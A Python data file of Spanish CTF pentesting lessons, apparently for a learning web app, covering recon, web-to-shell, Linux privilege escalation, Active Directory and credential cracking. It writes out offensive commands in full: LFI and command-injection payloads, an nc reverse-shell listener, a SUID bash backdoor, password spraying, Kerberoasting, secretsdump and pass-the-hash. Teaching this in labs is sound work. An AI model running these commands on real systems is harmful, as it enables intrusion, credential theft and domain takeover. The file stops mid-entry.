# Step-by-step learning guides for the "Aprender" mode of the web app.
# Prose-first: each step explains the idea (why), what to look for, and how to
# decide the next move. Commands carry per-command annotations: "why" (por que /
# cuando usar ese comando) and "out" (que detalles buscar en su salida). A command
# may also be a plain string (the renderer accepts both).
# "section" links a guide to its practice section (slug) for the "ver comandos" jump.
# Exported into web/data/content.json under "guides" by export_web_content.py.

GUIDES = [
    {
        "id": "metodologia",
        "title": "Como enfrentar una room",
        "phase": "recon",
        "section": "mapa-de-decisiones",
        "summary": "El mapa mental para no ir a ciegas: de la IP a root como una cadena de fases.",
        "steps": [
            {
                "title": "Entiende que es una cadena, no un truco",
                "idea": "Una room casi nunca se resuelve con un solo comando magico. Es una cadena: reconocimiento, enumeracion, acceso inicial y escalada de privilegios. Cada fase te da informacion que desbloquea la siguiente. La mayoria de atascos vienen de saltarte una fase o de no anotar lo que ya encontraste.",
                "commands": [
                    {
                        "cmd": "mkdir -p nmap web loot creds notes",
                        "why": "Ordenar el trabajo desde el minuto cero evita perder hallazgos. Una room se pierde tanto por no encontrar el vector como por olvidar una credencial que ya tenias anotada.",
                        "out": "No da salida: comprueba con ls que estan las carpetas. A partir de aqui guarda cada output en su carpeta (escaneos en nmap/, loot en loot/).",
                    },
                ],
                "look": "Una carpeta de trabajo por room y la IP fijada arriba en la app, para que los comandos se autocompleten con tu objetivo.",
                "decide": "Si no sabes por donde empezar, la respuesta siempre es recon. Nunca arranques lanzando exploits al azar.",
            },
            {
                "title": "Reconoce: que hay expuesto",
                "idea": "El objetivo es saber que servicios corren y en que version. No puedes atacar lo que no sabes que existe. Primero descubres puertos abiertos (rapido y amplio) y despues miras versiones y scripts solo en los que esten abiertos, para no hacer ruido innecesario.",
                "commands": [
                    {
                        "cmd": "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
                        "why": "Barres los 65535 puertos sin scripts porque es rapido y no asumes que los servicios esten en su puerto tipico (los labs los mueven). -Pn evita que nmap descarte el host por no responder al ping.",
                        "out": "Solo la lista de puertos en estado open. Ignora las versiones aqui; anota los numeros de puerto para el segundo escaneo.",
                    },
                    {
                        "cmd": "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
                        "why": "Ahora si pides version (-sV) y scripts por defecto (-sC), pero SOLO en los puertos abiertos, para no tardar una eternidad ni hacer ruido inutil.",
                        "out": "Version exacta de cada servicio (tu primera pista para CVEs), hostnames en certificados TLS y titulos de web. Apunta los hostnames a /etc/hosts.",
                    },
                ],
                "look": "Puertos abiertos y, sobre todo, versiones. Un servicio con version concreta es tu primera pista para buscar CVEs o formas de enumerar.",
                "decide": "Web (80/443) -> enumeracion web. SMB (445) -> enum de shares/usuarios. 88/389 -> es un dominio, piensa en Active Directory.",
            },
            {
                "title": "Enumera: convierte servicios en pistas",
                "idea": "Enumerar es exprimir cada servicio hasta encontrar la puerta. Aqui se gana o se pierde la room. La clave es interpretar: cada respuesta te dice algo. Un share legible, un endpoint de API, un usuario valido... son piezas que encajaras luego.",
                "commands": [
                    {
                        "cmd": "whatweb $URL",
                        "why": "Identifica de un vistazo la tecnologia web (CMS, framework, lenguaje, versiones). Saber si es WordPress o una API en Node cambia por completo que bug buscar.",
                        "out": "El CMS o framework y su version, cabeceras que delaten el backend, y redirecciones. WordPress/Joomla -> pasa a su enumeracion especifica.",
                    },
                    {
                        "cmd": "nxc smb $IP -u '' -p '' --shares",
                        "why": "Prueba acceso anonimo a SMB (sesion nula). Muchos labs dejan un share legible sin credenciales con configs o backups dentro; es el camino facil, compruebalo antes de complicarte.",
                        "out": "Columna de permisos READ/WRITE por share. Un READ en algo que no sea IPC$ es saqueo inmediato. Tambien el nombre del equipo y el dominio.",
                    },
                ],
                "look": "Nombres de usuario, rutas ocultas, ficheros de configuracion, versiones de software, mensajes de error que revelen tecnologia.",
                "decide": "Si encuentras credenciales -> pruebalas en todos los servicios. Si encuentras una version vulnerable -> valida el CVE antes de explotar.",
            },
            {
                "title": "Accede, estabiliza y escala",
                "idea": "Con una entrada (shell o login), lo primero es estabilizar y orientarte: quien eres y que permisos tienes. La escalada sigue la misma logica de siempre: buscar algo que un usuario mas privilegiado ejecuta, lee o confia, y que tu puedes tocar.",
                "commands": [
                    {
                        "cmd": "whoami; id; hostname",
                        "why": "Lo primero al pisar una maquina: saber quien eres, en que grupos estas y en que host. Sin esto disparas a ciegas.",
                        "out": "Tu usuario y uid. Grupos jugosos (sudo, docker, lxd, adm, disk). El hostname a veces revela el rol de la maquina (DC, web, db).",
                    },
                    {
                        "cmd": "sudo -l",
                        "why": "El primer vector de privesc a mirar siempre: que puedes ejecutar como otro usuario/root, idealmente sin password (NOPASSWD).",
                        "out": "Lineas '(root) NOPASSWD: /ruta/binario'. Cada binario que salga -> buscalo en GTFOBins para la receta de abuso.",
                    },
                ],
                "look": "Tu usuario, tus grupos, permisos sudo, tareas programadas, binarios con permisos raros, credenciales reutilizables.",
                "decide": "Cada credencial nueva -> reenumera todo desde el principio con ella. Root/SYSTEM -> recoge flags y anota el root cause (por que funciono).",
            },
        ],
    },
    {
        "id": "recon-paso-a-paso",
        "title": "Reconocimiento: de puertos a superficie",
        "phase": "recon",
        "section": "recon-y-servicios",
        "summary": "Por que se escanea asi y que hacer con cada tipo de servicio que aparece.",
        "steps": [
            {
                "title": "Primero todos los puertos, rapido",
                "idea": "Escaneas los 65535 puertos sin scripts primero porque es rapido y no quieres asumir que un servicio esta en su puerto tipico (muchos labs los mueven). -Pn evita que nmap descarte el host si no responde al ping, algo comun en maquinas filtradas.",
                "commands": [
                    {
                        "cmd": "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
                        "why": "-p- fuerza los 65535 puertos; sin -sV/-sC va rapido. --min-rate 5000 acelera; -n evita esperas de DNS. Es un barrido de amplitud, no de profundidad.",
                        "out": "Solo los puertos open. Si sale 1 o 2 puertos raros y altos, sospecha de servicios movidos a proposito. Copia los numeros para el siguiente escaneo.",
                    },
                ],
                "look": "La lista de puertos abiertos. Ignora de momento las versiones; solo quieres saber donde mirar.",
                "decide": "Con la lista de puertos, lanza el segundo escaneo SOLO sobre esos puertos. Escanear versiones de los 65535 es lento e inutil.",
            },
            {
                "title": "Ahora versiones y scripts, solo donde hace falta",
                "idea": "-sV detecta la version exacta del servicio y -sC lanza los scripts por defecto de nmap, que a menudo ya revelan cosas (titulos web, shares anonimos, certificados con hostnames). La version es oro: te dice que buscar en searchsploit.",
                "commands": [
                    {
                        "cmd": "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
                        "why": "Profundizas solo en los puertos que ya sabes abiertos. -sV te da la version (base de la busqueda de CVEs) y -sC saca informacion gratis con los scripts NSE por defecto.",
                        "out": "Versiones concretas, banners, hostnames en certificados (anadelos a /etc/hosts), y hallazgos de scripts como smb anonimo o titulos web reveladores.",
                    },
                ],
                "look": "Versiones concretas, hostnames en certificados, banners, y cualquier cosa que los scripts saquen gratis.",
                "decide": "Anota los hostnames que veas y anadelos a /etc/hosts; muchos vhosts solo responden por nombre, no por IP.",
            },
            {
                "title": "Enumera cada servicio por su naturaleza",
                "idea": "Cada servicio se enumera distinto. No memorices comandos sueltos: asocia puerto a objetivo. Web = rutas y parametros. SMB = shares y usuarios. DNS = transferencia de zona. La app tiene el bloque de comandos por servicio en Recon; usalo como chuleta.",
                "commands": [
                    {
                        "cmd": "whatweb $URL",
                        "why": "Puerto 80/443: lo primero es saber que software sirve la web para orientar el ataque (CMS conocido, framework, lenguaje).",
                        "out": "Tecnologia y versiones, cabeceras del servidor. Un CMS identificado te lleva a su herramienta dedicada (wpscan, etc.).",
                    },
                    {
                        "cmd": "nxc smb $IP -u '' -p '' --shares",
                        "why": "Puerto 445: comprueba sesion nula/anonima. Es la comprobacion mas rentable en SMB porque un share legible te ahorra toda la fase de explotacion.",
                        "out": "Shares con READ/WRITE. Fijate en nombres no estandar (backups, transfer, dev). El output tambien confirma nombre de equipo y dominio.",
                    },
                    {
                        "cmd": "snmpwalk -v2c -c public $IP",
                        "why": "Puerto 161/UDP: la community string 'public' por defecto expone muchisima informacion del sistema (procesos, usuarios, software, puertos).",
                        "out": "Nombres de usuario del sistema, procesos en ejecucion (con argumentos que a veces llevan credenciales), y software instalado con versiones.",
                    },
                ],
                "look": "Cualquier acceso sin credenciales (anonimo/guest), ficheros expuestos, o listados que revelen nombres de usuario reales.",
                "decide": "Si un servicio permite acceso anonimo, entra y saquea antes de buscar exploits. Lo facil primero.",
            },
        ],
    },
    {
        "id": "web-a-shell",
        "title": "De la web a una shell",
        "phase": "access",
        "section": "web-y-apis",
        "summary": "Como pasar de una pagina web a ejecutar comandos, razonando cada paso.",
        "steps": [
            {
                "title": "Fingerprint y descubrimiento",
                "idea": "Antes de buscar bugs, entiende que es la web: que tecnologia usa y que rutas existen. El fuzzing de directorios/ficheros revela paneles, backups, APIs o codigo fuente que no estan enlazados. Mide siempre una ruta que no exista para saber que responde el servidor y filtrar el ruido.",
                "commands": [
                    {
                        "cmd": "whatweb $URL",
                        "why": "La tecnologia condiciona los bugs probables: un PHP viejo huele a LFI/RCE, un template engine a SSTI. Empiezas por saber contra que juegas.",
                        "out": "Lenguaje/framework, versiones, cabeceras. Guardalo: te dira que extensiones fuzzear (.php, .aspx) y que familia de bug priorizar.",
                    },
                    {
                        "cmd": "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak -fc 404",
                        "why": "Descubre rutas y ficheros no enlazados (paneles, backups, codigo). -e prueba extensiones; -fc 404 filtra el ruido de lo que no existe.",
                        "out": "Rutas con codigo 200/301/403. Ojo al tamano (Size): respuestas del mismo tamano suelen ser falsos positivos; una distinta es interesante. Busca /admin, .bak, .git.",
                    },
                ],
                "look": "Rutas interesantes: /admin, /api, /backup, .git, ficheros .bak o de config. Y la tecnologia (PHP, Node, Python) que condiciona los bugs probables.",
                "decide": "Ves /api o /v1 -> fuzzea endpoints y metodos HTTP. Ves .git -> vuelca el repo. Ves un login -> prueba defaults y SQLi.",
            },
            {
                "title": "Encuentra la entrada (parametros y metodos)",
                "idea": "Los bugs viven en la entrada de datos: parametros GET/POST, cabeceras, campos JSON de una API. Un mismo endpoint puede ser inofensivo con GET y inyectable con PUT o POST. Por eso se fuzzea tambien el metodo HTTP, no solo la ruta.",
                "commands": [
                    {
                        "cmd": "for m in GET POST PUT DELETE PATCH; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
                        "why": "El mismo endpoint puede comportarse distinto segun el metodo. Un PUT/DELETE habilitado donde esperabas solo GET suele ser una via de escritura o borrado no prevista.",
                        "out": "El codigo HTTP por metodo. Un 200/201 en PUT/POST/DELETE donde GET daba 405/403 es la senal: ese metodo hace algo que el dev no protegio.",
                    },
                    {
                        "cmd": "arjun -u \"$URL/page.php\"",
                        "why": "Descubre parametros ocultos que no aparecen en el HTML. Un parametro no documentado (debug, file, cmd) es a menudo el que no esta saneado.",
                        "out": "Lista de parametros validos que la pagina acepta. Nombres tipo file/page/include -> prueba LFI; id/user -> SQLi/IDOR; cmd/exec -> command injection.",
                    },
                ],
                "look": "Parametros que cambian la respuesta, metodos que devuelven codigos distintos, mensajes de error de base de datos o de plantilla.",
                "decide": "Error SQL -> SQLi. {{7*7}} da 49 -> SSTI. Un parametro file/page -> prueba LFI. La respuesta refleja tu input -> XSS o SSTI.",
            },
            {
                "title": "Confirma la vulnerabilidad antes de explotar",
                "idea": "Confirmar evita perder horas con falsos positivos. Manda una prueba minima e inocua: para command injection, un id; para SQLi, una comilla o un OR 1=1; para LFI, /etc/passwd. Confirmar tambien te dice el contexto (usuario, SO) que necesitas para el siguiente paso.",
                "commands": [
                    {
                        "cmd": "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
                        "why": "Prueba de LFI con un fichero que siempre existe en Linux. Los ../ suben hasta la raiz sin importar la profundidad, asi que sirve aunque no sepas la ruta exacta.",
                        "out": "Lineas root:x:0:0 confirman lectura de ficheros. Si en vez de eso ves un error de include con una ruta, apunta esa ruta: te dice donde estas en el disco.",
                    },
                    {
                        "cmd": "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
                        "why": "Prueba de command injection: si la app pasa 'host' a un ping del sistema, el ; encadena tu comando. Usas id (inocuo) para confirmar sin romper nada.",
                        "out": "La salida de id (uid=... gid=...) mezclada con la respuesta normal confirma ejecucion. Fijate en el usuario: te dice con que privilegios ejecutas.",
                    },
                ],
                "look": "El contenido de /etc/passwd, la salida de id, un retraso si usaste sleep. Eso confirma que controlas algo del servidor.",
                "decide": "Confirmado -> escala a lectura de codigo/config o a ejecucion. No confirmado -> vuelve al paso anterior, prueba otro parametro o metodo.",
            },
            {
                "title": "Convierte en shell y estabiliza",
                "idea": "Con ejecucion de comandos, lanzas una reverse shell hacia tu maquina. La shell inicial es 'tonta' (sin Ctrl+C, sin autocompletado); estabilizarla a una TTY completa te ahorra errores y te deja trabajar comodo. Usa el generador de reverse shell de la app con tu IP de atacante.",
                "commands": [
                    {
                        "cmd": "nc -lvnp 4444",
                        "why": "Pone tu maquina a la escucha ANTES de disparar el payload. Si no tienes el listener abierto, la reverse shell conecta contra la nada y la pierdes.",
                        "out": "Espera 'listening on ...' y luego 'connect received' cuando entre la shell. Si no conecta, revisa que tu IP de atacante y el puerto coincidan con el payload.",
                    },
                    {
                        "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                        "why": "Primer paso para estabilizar una shell tonta: te da una pseudo-TTY, con lo que ya funcionan cosas como su o passwd que antes fallaban.",
                        "out": "El prompt cambia a uno normal (usuario@host). Despues completa con export TERM=xterm y, en tu Kali, stty raw -echo; fg para tener Ctrl+C y autocompletado.",
                    },
                ],
                "look": "La conexion entrante en tu listener y un prompt usable tras estabilizar (export TERM=xterm y stty raw -echo; fg).",
                "decide": "Shell estable -> empieza la enumeracion de privesc (whoami/id, sudo -l). Guarda como conseguiste la shell para el writeup.",
            },
        ],
    },
    {
        "id": "privesc-linux",
        "title": "Escalar a root en Linux",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "La mentalidad de la escalada y como pasar de enumerar a explotar.",
        "steps": [
            {
                "title": "La regla de oro",
                "idea": "Toda la escalada se resume en una idea: si puedes modificar, leer o influir en algo que un usuario mas privilegiado ejecuta o confia, tienes un vector. Un script que corre root y tu puedes editar, un binario SUID, una tarea cron con ruta escribible... todo es la misma logica.",
                "commands": [
                    {
                        "cmd": "whoami; id; groups; hostname; pwd",
                        "why": "Fija tu punto de partida. Los grupos, sobre todo, abren atajos: pertenecer a docker o lxd suele ser root casi directo sin buscar mas.",
                        "out": "Tu uid/gid y grupos. docker/lxd -> escape de contenedor a root. adm -> puedes leer logs. disk -> lectura cruda del disco. Sin grupos jugosos, sigue enumerando.",
                    },
                ],
                "look": "Tu usuario, tus grupos (docker/lxd/adm son interesantes) y donde estas. Es tu punto de partida.",
                "decide": "Grupo docker o lxd -> escape casi directo. Usuario normal -> sigue con la enumeracion sistematica.",
            },
            {
                "title": "Enumera de forma sistematica",
                "idea": "No adivines: recorre siempre los mismos vectores en orden. Empieza por lo que da resultados rapidos (sudo -l, SUID) y baja a lo mas laborioso (cron, configs). Un script como linpeas automatiza esto, pero entender que busca cada comando te hace mejor.",
                "commands": [
                    {
                        "cmd": "sudo -l",
                        "why": "El vector mas rentable y rapido: te dice literalmente que puedes ejecutar con privilegios. Muchas rooms se resuelven aqui mismo.",
                        "out": "Entradas (root) NOPASSWD: /bin/... . El binario permitido -> GTFOBins. Ojo tambien a env_keep y a rutas de scripts propios del reto.",
                    },
                    {
                        "cmd": "find / -perm -4000 -type f 2>/dev/null",
                        "why": "Lista binarios SUID (se ejecutan como su dueno, normalmente root). Un SUID que no sea del sistema base es un candidato claro de abuso.",
                        "out": "Rutas de binarios SUID. Ignora los tipicos (passwd, sudo, mount); fijate en cosas raras o versiones concretas (find, nmap, cp, python) -> GTFOBins.",
                    },
                    {
                        "cmd": "getcap -r / 2>/dev/null",
                        "why": "Las capabilities son permisos finos que dan poder sin ser SUID completo. cap_setuid en un binario permite cambiar a uid 0 igual que un SUID.",
                        "out": "Lineas binario = cap_xxx+ep. cap_setuid+ep sobre python/perl/etc es escalada directa. cap_dac_read_search permite leer cualquier fichero (como /etc/shadow).",
                    },
                ],
                "look": "Permisos sudo (sobre todo NOPASSWD), binarios SUID que no sean del sistema, capabilities como cap_setuid.",
                "decide": "Cualquier binario que salga -> buscalo en GTFOBins. Si esta ahi, tienes la receta exacta para abusar de el.",
            },
            {
                "title": "Explota el vector, no solo lo enumeres",
                "idea": "Encontrar el vector es la mitad; hay que ejecutarlo. GTFOBins te da la linea concreta para cada binario. La idea comun es forzar que ese proceso privilegiado te de una shell o te copie/edite algo como root (por ejemplo, poner el bit SUID a bash).",
                "commands": [
                    {
                        "cmd": "sudo find . -exec /bin/sh \\; -quit",
                        "why": "Ejemplo de GTFOBins: si puedes ejecutar find con sudo, su flag -exec lanza una shell que hereda los privilegios de root. El binario 'legitimo' te da la shell.",
                        "out": "El prompt cambia a # y id devuelve uid=0(root). Si sigue en $, el binario no corria como root o la sintaxis de abuso no era esa: revisa GTFOBins.",
                    },
                    {
                        "cmd": "cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
                        "why": "Patron clasico cuando puedes escribir/copiar como root: creas una copia de bash con bit SUID; -p conserva los privilegios al lanzarla, dandote una shell root persistente.",
                        "out": "Con /tmp/rootbash -p, id muestra euid=0. Es una puerta trasera comoda para reentrar; recuerda mencionarla y limpiarla en un entorno real.",
                    },
                ],
                "look": "Un prompt de root (# en vez de $) o un id que devuelve uid=0. Eso es el objetivo.",
                "decide": "Root -> recoge la flag de root y documenta el vector exacto. No funciona -> vuelve a la lista y prueba el siguiente vector, no te obsesiones con uno.",
            },
            {
                "title": "Loot y credenciales",
                "idea": "Aunque no seas root todavia, buscar credenciales en disco suele desbloquear la room: configs con contrasenas, historiales, claves SSH, backups. Muchas rooms se escalan reutilizando una password encontrada, no con un exploit.",
                "commands": [
                    {
                        "cmd": "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
                        "why": "Localiza directorios donde puedes escribir. Son clave para abusar de cron/scripts (metes tu payload) y para dejar herramientas. El grep quita ruido de pseudo-fs.",
                        "out": "Rutas escribibles inesperadas. Un directorio escribible que ademas aparece en una tarea cron o en el PATH de un script root es un vector de escalada directo.",
                    },
                    {
                        "cmd": "grep -riE 'password|passwd|secret' /var/www /home /opt 2>/dev/null | head",
                        "why": "Los devs dejan credenciales en texto claro en configs de la web y en el home. Es de lo primero que hay que peinar; a menudo es mas rapido que cualquier exploit.",
                        "out": "Lineas con password=... en configs (wp-config.php, .env, settings). Cada credencial -> pruebala con su usuario via su/ssh y reenumera sudo -l como el.",
                    },
                ],
                "look": "Contrasenas en texto claro, claves privadas, ficheros .env, historiales de bash con comandos que incluyan credenciales.",
                "decide": "Credencial encontrada -> pruebala con su usuario (su/ssh) y reenumera sudo -l como ese usuario. El camino a root suele ser en cadena.",
            },
        ],
    },
    {
        "id": "active-directory",
        "title": "Active Directory desde cero",
        "phase": "access",
        "section": "active-directory",
        "summary": "El enfoque cambia: no explotas una maquina, transformas identidad en permisos.",
        "steps": [
            {
                "title": "Prepara el terreno: nombres y hora",
                "idea": "AD funciona sobre nombres, no IPs. Kerberos falla si el hostname/dominio no resuelven o si tu reloj esta desincronizado con el DC. Antes de nada, identifica el dominio y el DC y anadelos a /etc/hosts. Sin esto, herramientas como impacket fallan con errores confusos.",
                "commands": [
                    {
                        "cmd": "nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,636,3268,5985 $IP",
                        "why": "Escaneas los puertos tipicos de un DC de golpe. La combinacion 88 (Kerberos) + 389 (LDAP) + 445 confirma que estas ante un dominio, no una maquina suelta.",
                        "out": "El puerto 88 abierto = es un DC. Los scripts LDAP/SMB filtran el nombre del dominio y del DC: anotalos ya para el /etc/hosts.",
                    },
                    {
                        "cmd": "echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts",
                        "why": "Kerberos y muchas herramientas resuelven por nombre. Sin esta linea en /etc/hosts fallaran con errores de DNS/realm que parecen otra cosa.",
                        "out": "tee reimprime la linea anadida. Verifica luego con ping o nslookup del hostname; a partir de aqui usa nombres, no la IP, en las herramientas de AD.",
                    },
                ],
                "look": "El nombre del dominio y del DC (los scripts de nmap y el rid-brute los revelan), y el puerto 88 (Kerberos) confirmando que es un DC.",
                "decide": "Error de clock skew -> sincroniza tu hora con el DC (ntpdate/faketime). Ya con nombres -> empieza a enumerar usuarios.",
            },
            {
                "title": "Consigue el primer punto de apoyo",
                "idea": "En AD todo empieza con un usuario valido, aunque sea sin password. Puedes sacar la lista de usuarios sin credenciales (RID brute, enum anonimo) y luego probar spraying controlado: una password candidata contra muchos usuarios. Cuidado: el spraying agresivo bloquea cuentas.",
                "commands": [
                    {
                        "cmd": "nxc smb $IP -u 'guest' -p '' --rid-brute | tee rid.txt",
                        "why": "Saca la lista de usuarios del dominio sin credenciales, iterando los RID via la cuenta guest/nula. Necesitas nombres validos antes de poder rociar passwords.",
                        "out": "Lineas con SidTypeUser: esos son usuarios reales. Extrae solo los nombres a users.txt (quita maquinas terminadas en $).",
                    },
                    {
                        "cmd": "nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success",
                        "why": "Password spraying: una sola password contra muchos usuarios. Una password por muchos usuarios evita bloqueos (lo contrario, muchas passwords por usuario, si bloquea).",
                        "out": "Un [+] DOMAIN\\usuario:password es credencial valida. --continue-on-success sigue tras el primer acierto por si hay varios. Cuidado con la politica de bloqueo.",
                    },
                ],
                "look": "Usuarios validos (nombre confirmado), o el patron usuario=password que muchos labs usan. Un [+] en netexec es una credencial buena.",
                "decide": "Credencial valida -> reenumera shares/LDAP/WinRM con ella. Sin credencial pero con usuarios -> prueba AS-REP roasting.",
            },
            {
                "title": "Kerberos: tickets crackeables",
                "idea": "Kerberos regala hashes crackeables offline. AS-REP roasting saca hashes de usuarios sin preauth (no necesitas password). Kerberoasting saca hashes de cuentas de servicio (SPN) si ya tienes una credencial. Los crackeas con hashcat y a menudo son la via a un usuario mas fuerte.",
                "commands": [
                    {
                        "cmd": "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP",
                        "why": "AS-REP roasting: pide tickets para usuarios con preauth de Kerberos desactivada. Con -no-pass no necesitas credenciales, solo la lista de usuarios.",
                        "out": "Hashes que empiezan por $krb5asrep$. Cada uno es crackeable offline. Si no sale ninguno, ningun usuario tiene preauth desactivada: pasa a otra via.",
                    },
                    {
                        "cmd": "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request",
                        "why": "Kerberoasting: con una credencial cualquiera pides tickets de cuentas de servicio (SPN). Esas cuentas suelen tener passwords debiles y muchos privilegios.",
                        "out": "Hashes $krb5tgs$ junto al nombre del servicio. Prioriza cuentas que parezcan admin (sql_admin, svc_backup): si crackean, sueles subir mucho de golpe.",
                    },
                    {
                        "cmd": "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
                        "why": "Crackea los hashes de Kerberoast (-m 13100; para AS-REP es -m 18200). Se hace offline, sin tocar el DC ni arriesgar bloqueos.",
                        "out": "La password en claro tras el hash cuando cae. Esa credencial -> vuelve a enumerar el dominio como ese usuario; suele desbloquear nuevos accesos.",
                    },
                ],
                "look": "Hashes que empiezan por $krb5asrep$ (AS-REP) o $krb5tgs$ (Kerberoast). Si crackean, tienes credenciales nuevas.",
                "decide": "Hash crackeado -> nueva credencial, vuelve a enumerar. Nada crackea -> pasa a BloodHound para buscar rutas por permisos.",
            },
            {
                "title": "BloodHound y camino a Domain Admin",
                "idea": "Con una credencial, BloodHound mapea el dominio y te muestra la ruta mas corta a Domain Admin abusando de permisos (GenericAll, WriteDACL, sesiones). Cuando encuentras la cuenta objetivo, extraes sus hashes (secretsdump/DCSync) y te autenticas con Pass-the-Hash sin saber la password.",
                "commands": [
                    {
                        "cmd": "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip",
                        "why": "Recolecta todo el grafo del dominio (usuarios, grupos, ACLs, sesiones) con una sola credencial. Ver las relaciones te evita adivinar el camino a mano.",
                        "out": "Un .zip que importas en la GUI de BloodHound. Alli marca tu usuario como owned y usa 'Shortest paths to Domain Admins' para leer la ruta.",
                    },
                    {
                        "cmd": "impacket-secretsdump $DOMAIN/$USER:$PASS@$IP",
                        "why": "Si tu usuario tiene privilegios de replicacion (DCSync) o admin local, vuelca los hashes NTLM del dominio, incluido administrator y krbtgt.",
                        "out": "Lineas usuario:rid:lmhash:nthash. El NT hash de administrator sirve para Pass-the-Hash. El de krbtgt permite Golden Ticket (persistencia total).",
                    },
                    {
                        "cmd": "evil-winrm -i $IP -u administrator -H <NTLM>",
                        "why": "Pass-the-Hash: te autenticas por WinRM con el hash NTLM en vez de la password. No necesitas crackear nada si ya tienes el hash.",
                        "out": "Un prompt PS de administrator. whoami confirma. Desde ahi recoge la flag de root/admin y documenta la cadena completa que te trajo hasta aqui.",
                    },
                ],
                "look": "En BloodHound: aristas de ACL peligrosas hacia grupos privilegiados. En secretsdump: el hash NTLM de administrator/krbtgt.",
                "decide": "Ruta clara en BloodHound -> abusa del permiso concreto. Hash de admin -> Pass-the-Hash con evil-winrm/psexec y recoge la flag.",
            },
        ],
    },
    {
        "id": "credenciales",
        "title": "Tengo credenciales, y ahora que",
        "phase": "access",
        "section": "credenciales-y-loot",
        "summary": "Buscar, identificar, crackear y reutilizar sin caos.",
        "steps": [
            {
                "title": "Sabe donde mirar",
                "idea": "Las credenciales no aparecen solas: viven en sitios predecibles. Ficheros de configuracion de la web, historiales de shell, claves SSH en homes, backups, y en Windows en configs de IIS o el gestor de credenciales. Buscar sistematicamente ahorra mas rooms que cualquier exploit.",
                "commands": [
                    {
                        "cmd": "grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head",
                        "why": "Peina en un barrido los sitios donde mas caen credenciales en claro: raiz web, homes y /opt. Es barato y rentable, hazlo antes de complicarte.",
                        "out": "Lineas con la credencial y el fichero donde vive. Fijate en el nombre del fichero (config, .env, backup): te da el contexto de para que servicio es esa clave.",
                    },
                    {
                        "cmd": "find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null",
                        "why": "Busca ficheros que SON credenciales aunque esten protegidos: vaults KeePass, claves SSH privadas y ficheros de entorno. Un id_rsa legible suele ser acceso directo.",
                        "out": "Rutas de esos ficheros. id_rsa legible -> ssh -i directo (dale chmod 600). .kdbx / zip protegido -> conviertelo a hash y crackea (siguiente paso).",
                    },
                ],
                "look": "Contrasenas en texto claro, claves privadas, ficheros .env, vaults de KeePass, tokens de API.",
                "decide": "Password en claro -> pruebala ya en todos los servicios. Fichero protegido (zip/kdbx/ssh) -> conviertelo a hash y crackea.",
            },
            {
                "title": "Identifica el hash antes de crackear",
                "idea": "Crackear con el modo equivocado no funciona nunca. Primero identifica el tipo de hash: la longitud y el formato dan pistas, y herramientas como hashid o name-that-hash te dan el modo de hashcat. Los ficheros con contrasena se convierten a hash con los *2john.",
                "commands": [
                    {
                        "cmd": "hashid 'HASH'",
                        "why": "Antes de crackear tienes que saber QUE es el hash: usar el modo equivocado de hashcat no rompe nada, solo pierdes horas. hashid propone el tipo.",
                        "out": "Lista de posibles tipos (MD5, NTLM, bcrypt, sha512crypt...). Cruzalo con el contexto (un hash de Windows es NTLM) para elegir el -m correcto de hashcat.",
                    },
                    {
                        "cmd": "ssh2john id_rsa > id_rsa.hash",
                        "why": "Una clave SSH protegida con passphrase no se crackea directa: hay que convertirla a un formato que john/hashcat entiendan. Eso hace ssh2john.",
                        "out": "Un fichero .hash con la representacion crackeable. Si ssh2john dice que la clave no tiene passphrase, no hay nada que crackear: usala directamente con ssh -i.",
                    },
                    {
                        "cmd": "keepass2john vault.kdbx > keepass.hash",
                        "why": "Mismo principio para un vault KeePass: lo conviertes a hash para atacar la master password offline. Dentro suele haber muchas credenciales de golpe.",
                        "out": "El hash del vault en keepass.hash. Crackea la master con rockyou; si cae, abre el .kdbx y saquea todas las entradas guardadas.",
                    },
                ],
                "look": "El tipo de hash (NTLM, bcrypt, MD5, krb5...) y su numero de modo en hashcat (-m) o el formato en john.",
                "decide": "Ya con el modo correcto -> a crackear. Si es un hash de red (NetNTLM) capturado, ese si merece Responder/relay, no solo crack.",
            },
            {
                "title": "Crackea con criterio",
                "idea": "Empieza siempre por rockyou: la mayoria de rooms usan passwords de ese diccionario. Si no cae, aplica reglas (best64) antes de saltar a fuerza bruta. hashcat usa GPU (rapido), john es comodo para formatos raros. No pierdas horas en fuerza bruta pura en un CTF.",
                "commands": [
                    {
                        "cmd": "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
                        "why": "hashcat usa GPU y es lo mas rapido para diccionario. -m 1000 es NTLM; cambia el numero segun lo que dijo hashid. rockyou cubre la mayoria de retos.",
                        "out": "Con --show o al terminar, la linea hash:password. Si no cae en minutos, no insistas con fuerza bruta: quiza el vector real no era crackear ese hash.",
                    },
                    {
                        "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                        "why": "john detecta muchos formatos automaticamente y es comodo para hashes raros o los generados por *2john (ssh, keepass, zip).",
                        "out": "john indica cuando crackea. Si no, prueba --rules para mutar rockyou (mayusculas, numeros al final) antes de rendirte.",
                    },
                    {
                        "cmd": "john --show hash.txt",
